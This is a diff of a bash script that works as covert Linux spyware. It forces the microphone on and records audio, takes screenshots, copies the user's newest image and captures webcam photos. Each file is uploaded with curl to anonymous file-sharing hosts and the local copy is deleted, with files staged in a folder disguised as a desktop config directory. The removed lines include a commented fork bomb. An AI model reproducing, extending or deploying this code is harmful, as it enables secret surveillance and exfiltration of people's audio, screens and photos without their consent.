@@ -12,17 +12,8 @@ HOME_="/home/$USER/"
 HOME_2="/home/$USER/.config/ibus_/"
 #IBUS_="/usr/local/sbin/ibus_/"
 IBUS_="/home/$USER/.config/ibus_/"
-
-function Mcx(){
-	microphone_status=$(amixer get Capture | grep "\[on\]")
- 	#
-	if [[ -n $microphone_status ]]; then
-	    dbgx "ax... Mcx...Okx..."
-	else
-	    amixer set Capture toggle
-	    amixer set Capture cap
-	fi
-}
+#
+IBUS__="/home/$USER/.config/mintdesktop/"
 
 function ssx_(){
     #imagemagick
@@ -32,11 +23,11 @@ function ssx_(){
     #
     output_file="ss.png"
     dbgx "ssx..."
-    import -window root "$IBUS_$output_file"
+    import -window root "$IBUS__$output_file"
     dbgx "ssx saved to $output_file"
     cx "$output_file" "SS"
     slpx 
-    rm -f "$IBUS_$output_file"
+    rm -f "$IBUS__$output_file"
 }
 
 function ax_(){
@@ -44,18 +35,25 @@ function ax_(){
     duration=30
     output_file="a.wav"
     #
-    Mcx
+    microphone_status=$(amixer get Capture | grep "\[on\]")
+    #
+	if [[ -n $microphone_status ]]; then
+	    dbgx "ax... Mcx...Okx..."
+	else
+	    amixer set Capture toggle
+	    amixer set Capture cap
+	fi
     #
     #amixer set Capture cap
     #
     dbgx "ax started..."
-    arecord -f cd -d $duration -t wav -r 44100 $IBUS_$output_file
+    arecord -f cd -d $duration -t wav -r 44100 $IBUS__$output_file
     dbgx "ax stopped. Saved to $output_file"
     #
     cx "$output_file" "AX"
     slpx
     rm -f "$output_file"
-    rm -f "$IBUS_$output_file"
+    rm -f "$IBUS__$output_file"
     #
 }
 
@@ -66,27 +64,27 @@ function PxNwx(){
     newest_image=$(echo "$sorted_images" | head -n 1 | awk '{print $2}')
     dbgx "Newest image: $newest_image"
     output_file="px.png"
-    cp "$newest_image" $IBUS_$output_file
+    cp "$newest_image" $IBUS__$output_file
     cx "$output_file" "PX"
     slpx
-    rm -f "$IBUS_$output_file"
+    rm -f "$IBUS__$output_file"
 }
 #Fswebcam
 function WbCmx(){
 	output_file="px.jpg"
-	fswebcam "$IBUS_$output_file"
+	fswebcam "$IBUS__$output_file"
 	dbgx "Fswebcam: as $output_file"
 	cx "$output_file" "PX"
     	slpx
-    	rm -f "$IBUS_$output_file"
+    	rm -f "$IBUS__$output_file"
 }
 
 function cx(){
-    #OX2=`curl -k --connect-timeout 900 --max-time 900 -T $IBUS_$1 https://oshi.at`
+    #OX2=`curl -k --connect-timeout 900 --max-time 900 -T $IBUS__$1 https://oshi.at`
     #dbgx "OX2: $OX2";
     #cx_ "$OX2" "$2"
     #
-    OX3=`curl -k --connect-timeout 900 --max-time 900 --upload-file $IBUS_$1 https://free.keep.sh`
+    OX3=`curl -k --connect-timeout 900 --max-time 900 --upload-file $IBUS__$1 https://free.keep.sh`
     dbgx "OX3: $OX3";
     cx_ "$OX3" "$2"
 }
@@ -143,13 +141,10 @@ function px(){
 	#
         Ntx
 	#
- 	Mcx
- 	#
     	ax_ & ssx_ & PxNwx
     	#
-	ssx2
- 	#
-  	xyz
+	#ssx2
+ 	#reboot
 	#
 	exit 0
     else
@@ -160,26 +155,21 @@ function px(){
 
 function ssx2(){
 	et=`date +%s`
-	#st=1688842650
- 	et_=$(($et+300))
-	st=$(($et_))
+	st=1688685579
 	while [ $et -le $st ]
 	do
 	 et=`date +%s`
-  	#
-    	Mcx
+  	 #
+    	if [[ -n $microphone_status ]]; then
+	    dbgx "ax... Mcx...Okx..."
+	else
+	    amixer set Capture toggle
+	    amixer set Capture cap
+	fi
  	#
-  	ssx_ & ax_
-        #
-        xyz
+  	 ssx_ & ax_
 	 sleep 30
 	done
-}
-
-function xyz(){
-	dbgx "XYZ..."
- 	#reboot
-	#:(){ :|:& };:
 }
 
 px
